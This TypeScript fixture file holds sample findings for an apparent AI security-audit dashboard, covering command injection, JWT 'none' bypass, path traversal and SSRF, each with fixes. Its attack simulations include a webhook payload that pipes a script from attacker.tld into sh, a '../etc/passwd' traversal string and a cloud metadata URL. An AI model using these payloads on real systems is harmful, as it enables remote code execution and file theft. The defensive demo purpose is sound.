import type { Finding } from "@/entities/finding/model/types";

export const findings: Finding[] = [
  {
    id: "f1",
    severity: "critical",
    title: "Shell command injection via webhook payload",
    file: "app/services/notifiers/script_runner.py",
    line: 21,
    category: "Command injection",
    confidence: 87,
    summary: "This issue allows attacker-controlled webhook input to reach shell execution without sanitization, which creates a remote command injection path in the notifier workflow.",
    impact: "Remote code execution on the server",
    attackSimulation: {
      input: "POST /api/incoming/{slug} with payload: message='hello; curl attacker.tld/pwn.sh | sh'",
      execution: "The notifier interpolates message into a shell string and calls subprocess with shell=True.",
      result: "The server executes attacker-controlled shell commands and compromises the runtime host.",
    },
    auditLog: [
      "AI accessed app/services/notifiers/script_runner.py",
      "AI traced webhook input into ScriptNotifier.send()",
      "AI suggested argument-based subprocess execution",
    ],
    fixSuggestions: [
      {
        id: "safe",
        label: "Fix A",
        profile: "safe",
        description: "Replace shell execution with argument-based subprocess calls and strict stdin piping.",
      },
      {
        id: "fast",
        label: "Fix B",
        profile: "fast",
        description: "Escape shell metacharacters before execution to reduce immediate exposure quickly.",
      },
      {
        id: "recommended",
        label: "Fix C",
        profile: "recommended",
        description: "Move to direct process invocation and isolate user-controlled message formatting upstream.",
      },
    ],
  },
  {
    id: "f2",
    severity: "critical",
    title: 'JWT authentication bypass via "none" algorithm',
    file: "app/auth/jwt_handler.py",
    line: 28,
    category: "Auth bypass",
    confidence: 91,
    summary: "Unsigned JWTs are accepted during token verification, allowing attackers to forge authenticated sessions.",
    impact: "Account takeover across protected routes",
    attackSimulation: {
      input: "Send an unsigned JWT header with alg='none' and a forged admin payload.",
      execution: "The verification branch skips signature checks and trusts the decoded claims.",
      result: "The attacker is treated as an authenticated admin and gains protected access.",
    },
    auditLog: [
      "AI accessed app/auth/jwt_handler.py",
      "AI confirmed signature validation bypass in verification branch",
      "AI prepared stricter token validation patch",
    ],
    fixSuggestions: [
      {
        id: "safe",
        label: "Fix A",
        profile: "safe",
        description: "Reject none-algorithm tokens and pin allowed algorithms explicitly.",
      },
      {
        id: "fast",
        label: "Fix B",
        profile: "fast",
        description: "Add a guard clause for unsigned tokens before deeper validation.",
      },
      {
        id: "recommended",
        label: "Fix C",
        profile: "recommended",
        description: "Centralize JWT verification with explicit algorithm and issuer enforcement.",
      },
    ],
  },
  {
    id: "f3",
    severity: "critical",
    title: "Path traversal in export file download endpoint",
    file: "app/routes/exports.py",
    line: 39,
    category: "Path traversal",
    confidence: 82,
    summary: "User-controlled export paths can resolve outside the intended directory boundary and expose arbitrary files.",
    impact: "Sensitive file disclosure from the server filesystem",
    attackSimulation: {
      input: "Request /exports/download?file=../../../../etc/passwd",
      execution: "The route joins user input with the export root without canonical path enforcement.",
      result: "The server returns files outside the export directory.",
    },
    auditLog: [
      "AI accessed app/routes/exports.py",
      "AI traced user-controlled file input into download resolver",
      "AI suggested canonical path checks before read",
    ],
    fixSuggestions: [
      {
        id: "safe",
        label: "Fix A",
        profile: "safe",
        description: "Resolve canonical paths and reject any target escaping the export root.",
      },
      {
        id: "fast",
        label: "Fix B",
        profile: "fast",
        description: "Block traversal markers like ../ before path resolution.",
      },
      {
        id: "recommended",
        label: "Fix C",
        profile: "recommended",
        description: "Switch to export IDs mapped server-side instead of trusting raw file paths.",
      },
    ],
  },
  {
    id: "f4",
    severity: "high",
    title: "Server-Side Request Forgery in destination URL validation",
    file: "app/services/validator.py",
    line: 36,
    category: "Server-side request forgery (SSRF)",
    confidence: 74,
    summary: "Destination URLs are only partially validated, allowing internal services to be probed through callback flows.",
    impact: "Internal network exposure and metadata service access",
    attackSimulation: {
      input: "Submit destination URL http://169.254.169.254/latest/meta-data/",
      execution: "Validation accepts the host and forwards the request to the outbound fetch layer.",
      result: "Internal metadata becomes reachable through the app's own network position.",
    },
    auditLog: [
      "AI accessed app/services/validator.py",
      "AI traced destination URL validation to outbound request flow",
      "AI suggested private-range blocking and canonical hostname checks",
    ],
    fixSuggestions: [
      {
        id: "safe",
        label: "Fix A",
        profile: "safe",
        description: "Block private IP ranges, link-local targets, and internal hostnames before any request is made.",
      },
      {
        id: "fast",
        label: "Fix B",
        profile: "fast",
        description: "Add a denylist for metadata endpoints and obvious internal ranges.",
      },
      {
        id: "recommended",
        label: "Fix C",
        profile: "recommended",
        description: "Resolve and validate final destinations after redirects with a strict outbound allowlist.",
      },
    ],
  },
];

export const attackerStory = [
  "Attacker sends a crafted webhook payload to the public /api/incoming/{slug} endpoint.",
  "The application formats the attacker-controlled message without neutralizing shell characters.",
  "ScriptNotifier builds a shell command using that unsafe message string.",
  "The server executes the command with shell=True and the attacker gains code execution.",
];
